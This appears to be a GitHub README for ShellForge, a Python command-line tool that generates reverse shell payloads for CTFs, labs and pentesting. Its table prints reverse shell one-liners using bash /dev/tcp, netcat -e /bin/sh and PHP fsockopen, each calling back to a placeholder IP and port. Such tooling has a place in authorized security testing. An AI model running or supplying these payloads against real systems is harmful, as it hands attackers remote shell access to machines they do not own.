# 🛠️ ShellForge — Payload Generator

> **Author:** [@Certifa](https://github.com/Certifa)
> 🐚 Tool: Reverse Shell Payload Generator
> 🧠 Inspired by Metasploit's style & CLI payload handling

---

![Shellforge demo](docs/shellforge.png)

## 📌 Description

**ShellForge** is a clean, simple Python CLI tool that generates reverse shell payloads for CTFs, labs, or pentesting environments.

✨ Features:

- Colorful Rich interface
- ASCII banner & stylized UX
- Auto-injected IP & PORT into payloads
- Works fully offline

---

## 🚀 Usage

```bash
python3 payloadgen.py <IP> <PORT>
```

### 🔍 Example

```bash
python3 payloadgen.py 10.10.14.5 4444
```

You will see a menu like:

```
1. Bash TCP
2. Python TCP
3. Netcat (traditional)
4. PHP
5. Exit
```

Select an option and the ready-to-use payload will be printed.

---

## 🎯 Payload Types

| Option | Language | Payload |
|--------|----------|---------|
| 1 | Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| 2 | Python | `python3 -c 'import os,socket,...'` |
| 3 | Netcat | `nc IP PORT -e /bin/sh` |
| 4 | PHP | `php -r '$sock=fsockopen("IP",PORT);exec(...)'` |

IP and PORT are automatically injected from the CLI.

---

## 📦 Requirements
- `Python 3.7+`

### 🔧 Install dependencies
```bash
git clone https://github.com/Certifa/ShellForge.git
```

```bash
pip install -r requirements.txt
```

---

## 🖼️ Preview

```shell
   /\
  |==|   Payload Generator
  |  |   ------------------
  |  |   Author: @Certifa
 /____\
[======]
|  💥  |   [~] Ready to forge shells
'------'
```

---

## 🔐 Legal & Ethics

**Use ShellForge responsibly.**

This tool is for educational and authorized use only.

> **Disclaimer:** The author is not responsible for misuse or damage. Always obtain explicit permission before testing.

---

## 📄 License

This project is licensed under the [MIT License](docs/mit.txt)

---

## 🛠️ Planned Features

- [ ] Export payload to text file
- [ ] Add reverse PowerShell payload
- [ ] Listener helper (e.g. start nc listener)

## 📚 Credits

- [Rich](https://github.com/Textualize/rich)
- [PyFiglet](https://github.com/pwaller/pyfiglet)
- Inspired by classic red teaming tools like Metasploit

---

## 🔗 Links

- GitHub: [https://github.com/Certifa/shellforge](https://github.com/Certifa/shellforge)
